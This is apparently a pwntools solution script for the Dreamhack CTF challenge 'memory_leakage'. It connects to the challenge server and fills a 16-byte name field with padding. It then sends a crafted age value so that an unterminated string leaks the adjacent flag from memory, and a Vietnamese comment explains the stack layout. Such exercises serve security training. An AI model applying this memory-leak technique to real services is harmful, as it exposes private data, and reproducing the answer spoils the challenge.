from pwn import *

exe = ELF('./memory_leakage', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 17480)

input()
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'1')
payload = b'a'*16
p.sendlineafter(b'Name: ', payload)

# name: esp + 20
# age: esp + 30
# Vì age nằm dưới name nên age nhập dưới dạng str -> leak được flag ngay dưới age
p.sendlineafter(b'Age: ', str(int(0x01010101)))
p.sendlineafter(b'> ', b'2')

p.interactive()